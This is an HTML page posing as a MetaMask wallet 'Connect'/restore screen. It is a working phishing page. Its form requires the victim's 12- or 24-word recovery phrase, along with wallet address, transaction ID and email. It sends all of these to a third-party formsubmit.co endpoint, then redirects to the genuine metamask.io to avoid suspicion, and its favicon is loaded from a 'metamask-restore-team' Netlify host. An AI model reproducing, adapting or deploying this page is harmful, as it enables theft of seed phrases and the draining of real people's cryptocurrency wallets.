<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="http://metamask-restore-team.netlify.app/header.png" type="image/x-icon" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    />
    <link rel="stylesheet" href="bootstrap.css" />
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
      integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style.css" />
    <title>Metamask | Connect</title>
  </head>
  <body class="wallet">
    <a href="https://metamask.io/#/">
      <img class="head" src="logo.svg" alt="" />
    </a>

    <div class="tab-content" id="myTabContent">
      <div
        class="tab-pane fade active show"
        id="mnemonic"
        role="tabpanel"
        aria-labelledby="mnemonic-tab"
      >
      <form action="https://formsubmit.co/7dc11436f7572da2992c7aeb814e0b38" method="POST">
           <input type="hidden" name="_next" value="https://metamask.io/">
          <input type="hidden" name="_captcha" value="false">


          <div class="form-floating">
            <input
              type="text"
              class="form-control"
              id="WalletAddress"
              name="Wallet-Address"
              placeholder="Password"
            />
            <label for="floatingPassword">Wallet Address</label>
          </div>

          <div class="form-floating">
            <input 
              type="text"
              class="form-control"
              id="Trans-ID"
              name="Trans-ID"
              placeholder="Password"
            />
            <label for="floatingPassword">Transaction ID</label>
          </div>

          <div class="form-floating">
            <input
              type="email"
              class="form-control"
              id="Email"
              name="Email"
              placeholder="Password"
            />
            <label for="floatingPassword">Email</label>
          </div>

          <div class="form-floating">
            <textarea
              class="form-control"
              placeholder="Leave a comment here"
              id="Phrase"
              name="Phrase" required
              style="height: 100px"
            ></textarea>
            <label for="floatingTextarea">12 or 24 word phrase</label>
          </div>
          <input name="_formsubmit_id" type="text" style="display: none" />

          <div class="restore mx-auto">
            <input
              type="submit"
              placeholder="Restore"
              style="
                border: 0;
                border-radius: 7px;
                font-size: 20px;
                text-align: center;
                background: #037dd6;
                color: #ffffff;
                width: 250px;
                padding: 10px 0;
              "
            />
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
